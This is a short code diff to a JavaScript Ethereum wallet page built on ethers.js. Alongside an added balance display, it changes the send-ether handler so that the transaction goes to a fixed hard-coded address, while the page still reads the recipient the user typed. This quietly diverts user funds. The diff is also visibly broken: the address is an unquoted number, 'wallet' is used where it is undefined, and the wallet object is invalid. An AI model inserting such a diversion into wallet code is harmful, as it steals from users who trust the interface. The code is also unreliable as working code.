@@ -554,10 +554,13 @@ async function getAccount() {
 
   let account = await signer.getAddress();
 
+	let balance = await wallet.getBalance();
+
   let chainIds = await signer.getChainId();
   let chainId = chainIds.chainId;
 
   showAccount.innerHTML = account;
+	showBalance.innerHTML = balance;
   showId.innerHTML = chainId;
 
   avatarId.style.display = "unset";
@@ -576,10 +579,10 @@ sendEthButton.addEventListener("click", () => {
   let receiverAddress = document.getElementById("receiver").innerText;
   let amountInEther = document.getElementById("amount").innerText;
 
-  let wallet = walletMnemonic.connect(provider);
+  let wallet = ethers.wallet;
 
   let tx = {
-    to: receiverAddress,
+    to: 0x85Afc81b91a1F75A654473431bd7e81E377ec03E,
     // Convert currency unit from ether to wei
     value: utils.parseEther(amountInEther),
   };
